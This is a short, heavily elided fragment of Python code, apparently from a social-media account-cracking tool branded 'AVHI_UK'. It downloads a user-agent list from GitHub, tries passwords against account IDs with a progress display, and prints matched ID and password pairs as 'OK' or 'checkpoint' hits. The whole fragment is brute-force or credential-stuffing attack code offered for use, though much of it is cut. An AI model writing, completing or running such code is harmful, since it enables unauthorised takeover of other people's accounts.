...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/ABHISHEKXBAAU/ua/blob/main/bbnew.txt').text
        ua=open('bbnew.txt','w')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r AVHI_UK ] {P}{k}\033[1;37m{loop}\033[1;31m{P}  {P}{H}[ok] - {ok}{P}]-{P}[{k}[cp] {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]     ")
    sys.stdout.flush()
    ...
    'user-agent': ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r[{b}CP-AVHI_UK✖{x}]{b} {b}{idf} | {pw}')
                ...
                print(f'\r{x}AVHI_UK_OK✔ {H}{idf} | {pw}{ua}{M}\n')
